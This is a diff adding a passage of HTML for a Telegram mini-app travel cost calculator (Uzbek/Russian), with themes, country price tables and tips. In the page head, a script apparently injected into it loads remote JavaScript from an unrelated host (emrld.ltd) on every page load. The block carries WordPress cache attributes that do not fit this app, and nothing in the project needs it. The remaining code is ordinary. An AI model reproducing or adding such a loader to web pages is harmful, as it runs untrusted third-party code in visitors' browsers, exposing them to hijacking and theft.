@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>✈️ Sayohat Kalkulyator</title>
+<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NTA4NjY1.js?t=508665';
+      document.head.appendChild(script);
+  })();
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Mono:wght@700&display=swap" rel="stylesheet">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+:root{
+--bg1:#07080f;--bg2:#0e1018;--bg3:#151823;
+--surf:rgba(255,255,255,.03);--surf2:rgba(255,255,255,.06);--surf3:rgba(255,255,255,.09);
+--brd:rgba(255,255,255,.07);--brd-a:rgba(99,213,190,.4);
+--text:#e2e8f0;--dim:#5a6075;--muted:#3a3f52;
+--acc:#63d5be;--acc2:#8b5cf6;--acc3:#f59e0b;
+--pink:#f472b6;--red:#ef4444;--green:#34d399;
+--grad:linear-gradient(135deg,#63d5be,#8b5cf6);
+--grad2:linear-gradient(135deg,#8b5cf6,#f472b6);
+--grad-tg:linear-gradient(135deg,#63d5be,#0088cc);
+--grain-opacity:.035;
+--glow-opacity:.12;
+--card-shadow:none;
+--cta-text:#07080f;
+}
+
+/* ===== LIGHT THEME ===== */
+html.light{
+--bg1:#f5f3f0;--bg2:#ece9e4;--bg3:#ffffff;
+--surf:rgba(0,0,0,.03);--surf2:rgba(0,0,0,.05);--surf3:rgba(0,0,0,.08);
+--brd:rgba(0,0,0,.08);--brd-a:rgba(16,130,110,.35);
+--text:#1a1a2e;--dim:#6b7280;--muted:#9ca3af;
+--acc:#0d9488;--acc2:#7c3aed;--acc3:#d97706;
+--pink:#db2777;--red:#dc2626;--green:#059669;
+--grad:linear-gradient(135deg,#0d9488,#7c3aed);
+--grad2:linear-gradient(135deg,#7c3aed,#db2777);
+--grad-tg:linear-gradient(135deg,#0d9488,#0088cc);
+--grain-opacity:.02;
+--glow-opacity:.06;
+--card-shadow:0 2px 12px rgba(0,0,0,.06);
+--cta-text:#ffffff;
+}
+html.light .glow-1{background:#0d9488}
+html.light .glow-2{background:#7c3aed}
+html.light .glow-3{background:#db2777}
+html.light .logo{color:var(--acc)}
+html.light .lbtn{background:var(--surf2);color:var(--acc);border-color:var(--brd)}
+html.light .cta{color:var(--cta-text)}
+html.light .nn{color:#fff}
+html.light .dbtn.sel{color:#fff}
+html.light .bk-val{color:var(--acc)}
+html.light .sv-num{color:var(--green)}
+html.light .st-pr{color:var(--acc)}
+html.light .sal-in{color:var(--text);background:var(--bg3)}
+html.light .rv-ok{background:rgba(5,150,105,.06);border-color:rgba(5,150,105,.2)}
+html.light .rv-mid{background:rgba(217,119,6,.06);border-color:rgba(217,119,6,.2)}
+html.light .rv-no{background:rgba(220,38,38,.04);border-color:rgba(220,38,38,.1)}
+html.light .badge-free{background:rgba(5,150,105,.1);color:#059669}
+html.light .badge-visa{background:rgba(217,119,6,.1);color:#d97706}
+html.light .badge-hot{background:rgba(219,39,119,.1);color:#db2777}
+html.light .res-hero{background:var(--bg3);box-shadow:var(--card-shadow)}
+html.light .bk{background:var(--bg3);box-shadow:var(--card-shadow)}
+html.light .sv{background:var(--bg3);box-shadow:var(--card-shadow)}
+html.light .tip{background:var(--bg3);box-shadow:var(--card-shadow)}
+html.light .mode{background:var(--bg3);box-shadow:var(--card-shadow)}
+html.light .rv{background:var(--bg3);box-shadow:0 1px 6px rgba(0,0,0,.04)}
+html.light .confetti-piece{mix-blend-mode:multiply}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow-x:hidden}
+body{font-family:'Plus Jakarta Sans',system-ui,sans-serif;background:var(--bg1);color:var(--text);min-height:100vh;-webkit-overflow-scrolling:touch;position:relative;transition:background .4s,color .4s}
+
+/* GRAIN */
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;opacity:var(--grain-opacity);
+background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+
+/* AMBIENT GLOW */
+.glow{position:fixed;pointer-events:none;z-index:0;border-radius:50%;filter:blur(80px);opacity:var(--glow-opacity);transition:opacity .5s}
+.glow-1{width:300px;height:300px;background:#63d5be;top:-80px;left:-60px;animation:gf 12s ease-in-out infinite}
+.glow-2{width:250px;height:250px;background:#8b5cf6;bottom:-50px;right:-50px;animation:gf 15s ease-in-out infinite reverse}
+.glow-3{width:200px;height:200px;background:#f472b6;top:40%;left:50%;animation:gf 10s ease-in-out infinite 3s}
+@keyframes gf{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(30px,-20px) scale(1.1)}66%{transform:translate(-20px,30px) scale(.9)}}
+
+@keyframes su{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pop{0%{transform:scale(.8);opacity:0}50%{transform:scale(1.05)}100%{transform:scale(1);opacity:1}}
+@keyframes count{from{opacity:0;transform:scale(.5) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+@keyframes bg{from{width:0}}
+@keyframes shine{0%{left:-100%}100%{left:100%}}
+@keyframes confetti{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(400px) rotate(720deg);opacity:0}}
+
+.sl{animation:su .5s ease forwards}
+.sl1{animation-delay:.05s;opacity:0}.sl2{animation-delay:.1s;opacity:0}.sl3{animation-delay:.15s;opacity:0}
+.sl4{animation-delay:.2s;opacity:0}.sl5{animation-delay:.25s;opacity:0}.sl6{animation-delay:.3s;opacity:0}
+.sl7{animation-delay:.35s;opacity:0}.sl8{animation-delay:.4s;opacity:0}.sl9{animation-delay:.45s;opacity:0}.sl10{animation-delay:.5s;opacity:0}
+
+.wrap{max-width:440px;margin:0 auto;padding:12px 16px 100px;position:relative;z-index:1}
+
+/* HEADER */
+.hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;padding-top:8px}
+.logo{font-family:'Space Mono',monospace;font-size:18px;font-weight:700;color:var(--acc);letter-spacing:-1px}
+.logo-sub{font-size:11px;color:var(--dim);margin-top:1px;font-weight:500}
+.lbtn{background:var(--surf2);border:1px solid var(--brd);border-radius:20px;padding:5px 12px;color:var(--acc);font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;backdrop-filter:blur(12px)}
+
+/* PROGRESS */
+.prog{display:flex;gap:4px;margin-bottom:16px}.prog-d{flex:1;height:2.5px;border-radius:2px;background:var(--surf2);transition:.3s}.prog-d.on{background:var(--grad)}
+
+.ttl{font-size:19px;font-weight:800;margin-bottom:3px;letter-spacing:-.3px}
+.hint{font-size:11px;color:var(--dim);margin-bottom:16px}
+
+/* COUNTRY CARDS — rich design */
+.c-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.c-card{background:var(--surf);border:1px solid var(--brd);border-radius:16px;padding:14px;cursor:pointer;transition:all .3s;position:relative;overflow:hidden;box-shadow:var(--card-shadow)}
+.c-card:active{transform:scale(.96)}
+.c-card.sel{border-color:var(--brd-a);background:rgba(99,213,190,.08)}
+.c-card::before{content:'';position:absolute;top:0;right:0;width:60px;height:60px;border-radius:0 16px 0 40px;opacity:.06;transition:.3s}
+.c-card:nth-child(1)::before{background:#ef4444}.c-card:nth-child(2)::before{background:#f59e0b}
+.c-card:nth-child(3)::before{background:#22c55e}.c-card:nth-child(4)::before{background:#3b82f6}
+.c-card:nth-child(5)::before{background:#a855f7}.c-card:nth-child(6)::before{background:#ec4899}
+.c-card:nth-child(7)::before{background:#14b8a6}.c-card:nth-child(8)::before{background:#06b6d4}
+.c-card:nth-child(9)::before{background:#f97316}.c-card:nth-child(10)::before{background:#eab308}
+.c-flag{font-size:32px;margin-bottom:6px;display:block}
+.c-name{font-weight:700;font-size:14px;letter-spacing:-.2px}
+.c-scene{font-size:11px;margin-top:2px;opacity:.6}
+.c-meta{font-size:10px;color:var(--dim);margin-top:6px;display:flex;gap:6px;align-items:center}
+.c-meta .badge{padding:2px 6px;border-radius:6px;font-size:9px;font-weight:700}
+.badge-free{background:rgba(52,211,153,.12);color:var(--green)}
+.badge-visa{background:rgba(245,158,11,.12);color:var(--acc3)}
+.badge-hot{background:rgba(244,114,182,.12);color:var(--pink)}
+.c-price{font-size:10px;color:var(--dim);margin-top:6px}
+
+/* STYLE CARDS */
+.st-list{display:flex;flex-direction:column;gap:8px;margin-bottom:24px}
+.st-card{display:flex;align-items:center;gap:14px;padding:14px 16px;background:var(--surf);border:1px solid var(--brd);border-radius:14px;cursor:pointer;transition:.2s;font-family:inherit;color:var(--text);width:100%;text-align:left}
+.st-card:active{transform:scale(.97)}
+.st-card.sel{border-color:var(--brd-a);background:rgba(99,213,190,.06)}
+.st-emo{font-size:28px;width:42px;height:42px;display:flex;align-items:center;justify-content:center;background:var(--surf2);border-radius:12px;flex-shrink:0}
+.st-lbl{font-weight:700;font-size:14px}.st-desc{font-size:11px;color:var(--dim);margin-top:1px}
+.st-pr{font-family:'Space Mono',monospace;font-size:13px;font-weight:700;color:var(--acc)}
+.st-pr small{font-size:9px;color:var(--dim)}
+
+/* OPTION PILLS */
+.opts{display:flex;gap:6px;margin-bottom:24px}
+.opt{flex:1;text-align:center;padding:12px 4px;background:var(--surf);border:1px solid var(--brd);border-radius:14px;cursor:pointer;color:var(--text);font-family:inherit;transition:.15s}
+.opt.sel{border-color:var(--brd-a);background:rgba(99,213,190,.06)}
+.opt:active{transform:scale(.95)}
+.opt-emo{font-size:22px}.opt-lbl{font-size:10px;font-weight:600;margin-top:3px;letter-spacing:.3px;text-transform:uppercase}
+.opt-pr{font-size:9px;color:var(--dim);margin-top:2px}
+
+/* DURATION */
+.dur{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+.dbtn{background:var(--surf2);border:1px solid var(--brd);border-radius:12px;padding:10px 18px;color:var(--text);font-weight:700;font-size:14px;cursor:pointer;font-family:inherit;transition:.2s}
+.dbtn.sel{background:var(--acc);color:var(--bg1);border-color:var(--acc)}
+.dbtn:active{transform:scale(.94)}
+
+/* NAV */
+.nav{display:flex;gap:8px;margin-top:20px}
+.nb{flex:1;background:var(--surf);border:1px solid var(--brd);border-radius:14px;padding:13px;color:var(--acc);font-weight:600;font-size:14px;cursor:pointer;font-family:inherit}
+.nn{flex:2;background:var(--grad);border:none;border-radius:14px;padding:13px;color:var(--bg1);font-weight:700;font-size:14px;cursor:pointer;font-family:inherit}
+.nb:active,.nn:active{transform:scale(.96)}
+
+/* RESULT HERO */
+.res-hero{background:var(--bg3);border:1px solid var(--brd);border-radius:24px;padding:28px 20px 20px;margin-bottom:16px;text-align:center;position:relative;overflow:hidden}
+.res-hero::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--grad)}
+.res-hero::after{content:'';position:absolute;top:-40px;right:-40px;width:120px;height:120px;border-radius:50%;background:radial-gradient(circle,rgba(99,213,190,.1),transparent);pointer-events:none}
+.res-ctry{font-size:13px;color:var(--dim);margin-bottom:8px}
+.res-total{font-family:'Space Mono',monospace;font-size:48px;font-weight:700;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:count .6s ease forwards}
+.res-uzs{font-size:12px;color:var(--dim);margin-top:4px}
+.res-tag{margin-top:16px;padding:10px 14px;background:var(--surf);border-radius:12px;display:inline-flex;align-items:center;gap:8px}
+.res-wd{margin-top:10px;padding:10px 14px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.12);border-radius:12px;font-size:13px}
+.res-wd b{font-family:'Space Mono',monospace;font-size:18px;color:var(--acc3)}
+
+/* BREAKDOWN */
+.bk{background:var(--bg3);border:1px solid var(--brd);border-radius:18px;padding:16px;margin-bottom:16px}
+.bk-row{display:flex;align-items:center;gap:10px;padding:9px 0;border-bottom:1px solid rgba(255,255,255,.03)}
+.bk-row:last-child{border-bottom:none}
+.bk-bar{width:80px;height:5px;border-radius:3px;background:var(--surf2);overflow:hidden}
+.bk-fill{height:100%;border-radius:3px;background:var(--grad);animation:bg .8s ease forwards}
+.bk-val{font-family:'Space Mono',monospace;font-weight:700;font-size:13px;min-width:55px;text-align:right;color:var(--acc)}
+
+/* SAVING */
+.sv{background:var(--bg3);border:1px solid rgba(52,211,153,.1);border-radius:18px;padding:16px;margin-bottom:16px}
+.sv-grid{display:flex;gap:8px;margin-top:10px}
+.sv-item{flex:1;text-align:center;padding:10px 4px;background:var(--surf);border-radius:12px}
+.sv-num{font-family:'Space Mono',monospace;font-size:20px;font-weight:700;color:var(--green)}
+.sv-lbl{font-size:9px;color:var(--dim);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
+
+/* TIP */
+.tip{background:var(--bg3);border:1px solid rgba(245,158,11,.1);border-radius:18px;padding:14px;margin-bottom:16px}
+
+/* CTA */
+.cta{display:block;width:100%;background:var(--grad-tg);border:none;border-radius:16px;padding:15px;color:var(--bg1);font-weight:700;font-size:15px;text-align:center;cursor:pointer;text-decoration:none;margin-bottom:4px;position:relative;overflow:hidden}
+.cta::after{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);animation:shine 3s infinite}
+.cta-inner{display:flex;align-items:center;justify-content:center;gap:8px;position:relative;z-index:1}
+.cta-sub{text-align:center;font-size:11px;color:var(--dim);margin-bottom:16px}
+.brow{display:flex;gap:8px}
+.bbtn{flex:1;background:var(--surf);border:1px solid var(--brd);border-radius:14px;padding:12px;color:var(--acc);font-weight:600;font-size:13px;cursor:pointer;font-family:inherit}
+.bbtn:active{transform:scale(.95)}
+
+/* MODE CARDS */
+.modes{display:flex;flex-direction:column;gap:12px;margin-top:20px}
+.mode{background:var(--bg3);border:1px solid var(--brd);border-radius:20px;padding:20px;cursor:pointer;transition:.2s;display:flex;align-items:center;gap:16px;position:relative;overflow:hidden}
+.mode:active{transform:scale(.97)}
+.mode::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
+.mode:nth-child(1)::before{background:var(--grad)}
+.mode:nth-child(2)::before{background:linear-gradient(90deg,var(--acc3),var(--pink))}
+.mode:nth-child(3)::before{background:linear-gradient(90deg,var(--green),var(--acc))}
+.mode-ico{font-size:36px;width:56px;height:56px;display:flex;align-items:center;justify-content:center;background:var(--surf2);border-radius:16px;flex-shrink:0}
+.mode-t{font-size:16px;font-weight:700;letter-spacing:-.2px}
+.mode-d{font-size:11px;color:var(--dim);margin-top:3px;line-height:1.4}
+
+/* REVERSE/WORK */
+.sal-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
+.sal-in{flex:1;background:var(--bg3);border:1px solid var(--brd);border-radius:14px;padding:13px 16px;color:#fff;font-size:16px;font-family:'Space Mono',monospace;font-weight:700;outline:none;letter-spacing:-.5px}
+.sal-in:focus{border-color:var(--acc)}
+.sal-lbl{font-size:12px;color:var(--dim);white-space:nowrap;font-weight:500}
+
+.rv-grid{display:flex;flex-direction:column;gap:6px}
+.rv{display:flex;align-items:center;gap:10px;padding:12px 14px;background:var(--bg3);border:1px solid var(--brd);border-radius:14px;transition:.2s}
+.rv-ok{border-color:rgba(52,211,153,.2);background:rgba(52,211,153,.04)}
+.rv-mid{border-color:rgba(245,158,11,.2);background:rgba(245,158,11,.04)}
+.rv-no{border-color:rgba(239,68,68,.1);opacity:.4}
+.rv-flag{font-size:22px}.rv-name{flex:1;font-size:13px;font-weight:600}
+.rv-info{text-align:right}.rv-num{font-family:'Space Mono',monospace;font-weight:700;font-size:15px}
+.rv-det{font-size:9px;color:var(--dim);margin-top:1px}
+
+/* CONFETTI */
+.confetti-container{position:fixed;top:0;left:0;right:0;pointer-events:none;z-index:100;overflow:hidden;height:100vh}
+.confetti-piece{position:absolute;width:8px;height:8px;top:-10px;animation:confetti 2.5s ease-in forwards}
+
+.step{display:none}.step.on{display:block}
+</style>
+</head>
+<body>
+<div class="glow glow-1"></div><div class="glow glow-2"></div><div class="glow glow-3"></div>
+<div class="wrap">
+<div class="hdr">
+<div><div class="logo" id="hT">✈ NOMADS</div><div class="logo-sub" id="hS"></div></div>
+<div style="display:flex;gap:6px">
+<button class="lbtn" id="tb" onclick="tT()" aria-label="Theme">🌙</button>
+<button class="lbtn" id="lb" onclick="tL()">RU</button>
+</div>
+</div>
+<div class="prog" id="prog" style="display:none"><div class="prog-d" id="p1"></div><div class="prog-d" id="p2"></div><div class="prog-d" id="p3"></div><div class="prog-d" id="p4"></div></div>
+<div class="step on" id="s0"></div><div class="step" id="s1"></div><div class="step" id="s2"></div>
+<div class="step" id="s3"></div><div class="step" id="s4"></div><div class="step" id="s5"></div><div class="step" id="s6"></div>
+<div class="confetti-container" id="confetti"></div>
+</div>
+
+<script>
+// ===== THEME: auto day/night + manual toggle =====
+let isDark = true;
+function initTheme() {
+    const h = new Date().getHours();
+    // Uzbekistan UTC+5: если юзер в другом часовом поясе — берём локальное время
+    const isNight = h < 6 || h >= 20;
+    isDark = isNight;
+    // Check TG theme
+    try {
+        const tgTheme = window.Telegram?.WebApp?.colorScheme;
+        if (tgTheme === 'light') isDark = false;
+        if (tgTheme === 'dark') isDark = true;
+    } catch(e) {}
+    applyTheme();
+}
+function applyTheme() {
+    document.documentElement.classList.toggle('light', !isDark);
+    const tb = document.getElementById('tb');
+    if (tb) tb.textContent = isDark ? '☀️' : '🌙';
+}
+function tT() {
+    isDark = !isDark;
+    applyTheme();
+    try { window.Telegram?.WebApp?.HapticFeedback?.impactOccurred?.('light') } catch(e) {}
+}
+initTheme();
+
+const C=[
+{id:"turkey",f:"🇹🇷",n:{uz:"Turkiya",ru:"Турция"},v:0,p:1,sc:{uz:"Antalya • Stambul • Kapadokiya",ru:"Анталья • Стамбул • Каппадокия"}},
+{id:"uae",f:"🇦🇪",n:{uz:"Dubay",ru:"Дубай"},v:0,p:1,sc:{uz:"Burj Xalifa • Sahro safari",ru:"Бурдж-Халифа • Сафари"}},
+{id:"thailand",f:"🇹🇭",n:{uz:"Tayland",ru:"Таиланд"},v:0,p:1,sc:{uz:"Phuket • Bangkok • Pattaya",ru:"Пхукет • Бангкок • Паттайя"}},
+{id:"egypt",f:"🇪🇬",n:{uz:"Misr",ru:"Египет"},v:1,p:1,sc:{uz:"Piramida • Sharm el-Sheikh",ru:"Пирамиды • Шарм-эль-Шейх"}},
+{id:"vietnam",f:"🇻🇳",n:{uz:"Vyetnam",ru:"Вьетнам"},v:1,p:0,sc:{uz:"Ha Long • Xo Shi Min",ru:"Халонг • Хошимин"}},
+{id:"malaysia",f:"🇲🇾",n:{uz:"Malayziya",ru:"Малайзия"},v:0,p:0,sc:{uz:"Langkawi • Kuala Lumpur",ru:"Лангкави • Куала-Лумпур"}},
+{id:"indonesia",f:"🇮🇩",n:{uz:"Bali",ru:"Бали"},v:0,p:0,sc:{uz:"Ubud • Seminyak • Nusa Penida",ru:"Убуд • Семиньяк • Нуса Пенида"}},
+{id:"maldives",f:"🇲🇻",n:{uz:"Maldiv",ru:"Мальдивы"},v:0,p:0,sc:{uz:"Okean villa • Snorkel",ru:"Виллы на воде • Снорклинг"}},
+{id:"georgia",f:"🇬🇪",n:{uz:"Gruziya",ru:"Грузия"},v:0,p:0,sc:{uz:"Tbilisi • Batumi • Kazbek",ru:"Тбилиси • Батуми • Казбек"}},
+{id:"china",f:"🇨🇳",n:{uz:"Xitoy",ru:"Китай"},v:1,p:0,sc:{uz:"Pekin • Shanghai • Ulug devor",ru:"Пекин • Шанхай • Стена"}},
+];
+
+const P={
+turkey:{fl:[280,450,700,1400],ht:[20,50,110,280],fd:[8,18,35,75],fn:[5,12,30,65],vi:0,in:2},
+uae:{fl:[380,500,850,2000],ht:[35,75,170,450],fd:[12,25,55,140],fn:[8,20,45,90],vi:0,in:2},
+thailand:{fl:[480,650,1000,2500],ht:[12,35,90,320],fd:[6,12,30,75],fn:[4,12,28,55],vi:0,in:2},
+egypt:{fl:[380,530,800,1600],ht:[18,40,90,230],fd:[6,15,30,65],fn:[4,12,25,55],vi:25,in:2},
+vietnam:{fl:[520,680,1050,2400],ht:[8,25,70,230],fd:[4,10,25,65],fn:[3,8,22,45],vi:25,in:2},
+malaysia:{fl:[480,660,1000,2300],ht:[12,35,90,280],fd:[6,12,30,75],fn:[4,10,25,55],vi:0,in:2},
+indonesia:{fl:[520,700,1100,2700],ht:[10,30,90,380],fd:[5,12,30,75],fn:[4,10,22,55],vi:0,in:2},
+maldives:{fl:[580,750,1150,2500],ht:[45,90,230,750],fd:[12,25,55,140],fn:[8,20,45,90],vi:0,in:3},
+georgia:{fl:[220,340,580,1200],ht:[12,30,70,190],fd:[6,12,25,55],fn:[3,8,18,35],vi:0,in:1.5},
+china:{fl:[360,500,800,1900],ht:[12,35,90,280],fd:[4,12,30,75],fn:[4,10,22,55],vi:50,in:2},
+};
+
+const TIPS={uz:{turkey:"AJet — $280 dan. Vizasiz 90 kun!",uae:"Flydubai $380. Metro bilan hamma joy",thailand:"Vizasiz 14 kun. Street food $2",egypt:"All-inclusive $35/kun",vietnam:"Eng arzon Osiyo — $15/kun",malaysia:"Langkawi duty free!",indonesia:"Skuter $4/kun",maldives:"Guesthouse $45",georgia:"Vizasiz 1 yil!",china:"Tranzit 144 soat vizasiz"},
+ru:{turkey:"AJet от $280. Без визы 90 дней!",uae:"Flydubai от $380. Метро покрывает всё",thailand:"Без визы 14 дней. Еда $2",egypt:"All-inclusive от $35/день",vietnam:"Самая дешёвая Азия — $15/день",malaysia:"Лангкави duty free!",indonesia:"Скутер $4/день",maldives:"Гестхаус от $45",georgia:"Без визы на год!",china:"Транзит 144ч без визы"}};
+
+const SE=["🎒","✈️","💎","👑"],FE=["🌯","🍽️","🥂","🍾"],UE=["📸","🎯","🎢","🌟"];
+
+const T={uz:{title:"NOMADS",sub:"Sayohat kalkulyator",
+m1:"✈️ Sayohat narxi",m1d:"Davlat va uslubni tanlab narxni biling",
+m2:"💼 Necha kun ishlash?",m2d:"Oyligingizga necha kun ishlash kerak",
+m3:"💰 Pulim yetadimi?",m3d:"Byudjetingizga qayerga yetadi",
+sc:"Davlat tanlang",scH:"Toshkentdan",nv:"Vizasiz",yv:"Viza",from:"dan",
+ss:"Uslub",sd:"Necha kun?",days:"kun",
+sn:["Backpacker","Standart","Premium","Hashamat"],snD:["Xostel • avtobus","3★ • taksi","4-5★ • business","Lyuks • VIP"],
+sf:"Ovqat",su:"Ko'ngilochar",sfn:["Street food","Aralash","Restoran","Fine dining"],sun:["Minimal","O'rtacha","Faol","Hammasi"],
+fl:"Parvoz",ht:"Mehmonxona",fd:"Ovqat",fn:"Ko'ngilochar",vi:"Viza",ins:"Sug'urta",
+ok:"Arzon",mid:"O'rtacha",exp:"Qimmat",vexp:"Juda qimmat",sal:"oylik",yng:"yosh mutaxassis",
+sv:"Jamg'arish",mo:"oy",tip:"💡 Maslahat",
+cta:"Kanalga obuna bo'lish",ctaS:"@nomadsclan • Arzon sayohat sirlari",
+re:"Qaytadan",oth:"Boshqa davlat",nx:"Keyingi",bk:"Orqaga",rs:"Natija",pd:"kun",
+wt:"Necha kun ishlash kerak?",ws:"Oyligingizni kiriting",wd:"ish kuni",wl:"Oylik (so'm)",
+wn:"O'rtacha: ~6.4 mln so'm",
+rt:"Byudjetga qayerga borish mumkin?",rl:"Byudjet ($)",rd:"kun",
+rn:"Standart: 3★, aralash ovqat",rok:"Yetadi",rno:"Yetmaydi",rtight:"Zo'rg'a",rgreat:"Ortadi!",
+},ru:{title:"NOMADS",sub:"Калькулятор путешествий",
+m1:"✈️ Стоимость поездки",m1d:"Выберите страну и стиль",
+m2:"💼 Сколько работать?",m2d:"Сколько рабочих дней на поездку",
+m3:"💰 Куда хватит?",m3d:"Покажем куда хватит бюджета",
+sc:"Выберите страну",scH:"Из Ташкента",nv:"Без визы",yv:"Виза",from:"от",
+ss:"Стиль",sd:"Сколько дней?",days:"дней",
+sn:["Бэкпекер","Стандарт","Премиум","Люкс"],snD:["Хостел • автобус","3★ • такси","4-5★ • бизнес","Люкс • VIP"],
+sf:"Питание",su:"Развлечения",sfn:["Стрит-фуд","Смешанный","Рестораны","Fine dining"],sun:["Минимум","Средне","Активно","Всё"],
+fl:"Перелёт",ht:"Отель",fd:"Еда",fn:"Развлечения",vi:"Виза",ins:"Страховка",
+ok:"Доступно",mid:"Средне",exp:"Дорого",vexp:"Очень дорого",sal:"зарплат",yng:"мол. спец.",
+sv:"Накопления",mo:"мес",tip:"💡 Совет",
+cta:"Подписаться на канал",ctaS:"@nomadsclan • Секреты путешествий",
+re:"Заново",oth:"Другая страна",nx:"Далее",bk:"Назад",rs:"Результат",pd:"д",
+wt:"Сколько дней работать?",ws:"Введите зарплату",wd:"раб. дней",wl:"Зарплата (сум)",
+wn:"Средняя: ~6.4 млн сум",
+rt:"Куда хватит бюджета?",rl:"Бюджет ($)",rd:"дн.",
+rn:"Стандарт: 3★, смешанное питание",rok:"Хватит",rno:"Не хватит",rtight:"Впритык",rgreat:"С запасом!",
+}};
+
+let L="uz",step=0,mode=0,country=null,style=1,days=7,foodS=1,funS=1,salary=6400000,budget=800;
+const $=id=>document.getElementById(id),t=()=>T[L],hp=t=>{try{window.Telegram?.WebApp?.HapticFeedback?.impactOccurred?.(t||'light')}catch(e){}};
+const fU=n=>"$"+Math.round(n).toLocaleString(),fS=u=>{const s=Math.round(u*12580);return s>=1e6?(Math.round(s/1e5)/10)+" mln":Math.round(s/1e3)+"k"};
+function calc(c,si,d,fi,fui){const p=P[c];if(!p)return null;const fl=p.fl[si],ht=p.ht[si]*d,fd=p.fd[fi]*d,fn=p.fn[fui]*d,vi=p.vi,ins=p.in*d;return{fl,ht,fd,fn,vi,ins,total:fl+ht+fd+fn+vi+ins}}
+function tag(m){if(m<=1)return{l:t().ok,c:"#34d399",e:"🟢"};if(m<=2.5)return{l:t().mid,c:"#f59e0b",e:"🟡"};if(m<=5)return{l:t().exp,c:"#f97316",e:"🟠"};return{l:t().vexp,c:"#ef4444",e:"🔴"}}
+
+let tg=null;try{tg=window.Telegram?.WebApp;if(tg){tg.ready();tg.expand();tg.BackButton.onClick(()=>{if(step>0)go(step>=4?0:step-1)})}}catch(e){}
+
+function confetti(){const c=$('confetti');c.innerHTML='';const colors=['#63d5be','#8b5cf6','#f472b6','#f59e0b','#34d399','#ef4444'];
+for(let i=0;i<40;i++){const p=document.createElement('div');p.className='confetti-piece';p.style.cssText=`left:${Math.random()*100}%;background:${colors[i%6]};border-radius:${Math.random()>.5?'50%':'2px'};animation-delay:${Math.random()*.8}s;animation-duration:${1.5+Math.random()*1.5}s;width:${5+Math.random()*6}px;height:${5+Math.random()*6}px`;c.appendChild(p)}
+setTimeout(()=>c.innerHTML='',3500)}
+
+function go(n){hp('light');step=n;document.querySelectorAll('.step').forEach(s=>s.classList.remove('on'));$('s'+n).classList.add('on');
+$('prog').style.display=(mode===0&&n>=1&&n<=4)?'flex':'none';for(let i=1;i<=4;i++)$('p'+i).className='prog-d'+(i<=n?' on':'');
+if(tg){n>0?tg.BackButton.show():tg.BackButton.hide()}
+if(n===0)rH();if(n===1)r1();if(n===2)r2();if(n===3)r3();if(n===4){r4();confetti()}if(n===5)r5();if(n===6)r6()}
+
+function tL(){L=L==='uz'?'ru':'uz';hp('light');$('lb').textContent=L==='uz'?'RU':'UZ';go(step)}
+
+function rH(){$('hT').textContent=t().title;$('hS').textContent=t().sub;
+$('s0').innerHTML=`<div class="sl" style="text-align:center;padding-top:12px">
+<div style="font-size:56px;animation:pulse 2.5s ease infinite">🌍</div>
+<h2 style="font-size:22px;font-weight:800;margin:10px 0 4px">${t().sub}</h2>
+<div class="modes">
+<div class="mode sl sl1" onclick="mode=0;go(1)"><div class="mode-ico">✈️</div><div><div class="mode-t">${t().m1}</div><div class="mode-d">${t().m1d}</div></div></div>
+<div class="mode sl sl2" onclick="mode=1;go(5)"><div class="mode-ico">💼</div><div><div class="mode-t">${t().m2}</div><div class="mode-d">${t().m2d}</div></div></div>
+<div class="mode sl sl3" onclick="mode=2;go(6)"><div class="mode-ico">💰</div><div><div class="mode-t">${t().m3}</div><div class="mode-d">${t().m3d}</div></div></div>
+</div></div>`}
+
+function r1(){let h=`<div class="sl"><h2 class="ttl">${t().sc}</h2><p class="hint">${t().scH}</p><div class="c-grid">`;
+C.forEach((c,i)=>{const s=country===c.id?' sel':'';const vi=c.v?`<span class="badge badge-visa">${t().yv}</span>`:`<span class="badge badge-free">${t().nv}</span>`;const hot=c.p?`<span class="badge badge-hot">🔥</span>`:'';
+h+=`<div class="c-card sl sl${i+1}${s}" onclick="country='${c.id}';hp('medium');go(2)">
+<span class="c-flag">${c.f}</span><div class="c-name">${c.n[L]}</div><div class="c-scene">${c.sc[L]}</div>
+<div class="c-meta">${vi}${hot}</div><div class="c-price">${t().from} ${fU(P[c.id].fl[0])} ✈️</div></div>`});
+h+='</div></div>';$('s1').innerHTML=h}
+
+function r2(){let h=`<div class="sl"><h2 class="ttl">${t().ss}</h2><div class="st-list">`;
+for(let i=0;i<4;i++){const s=style===i?' sel':'';const pr=country?`<div class="st-pr">${fU(P[country].ht[i])}<small>/🌙</small></div>`:'';
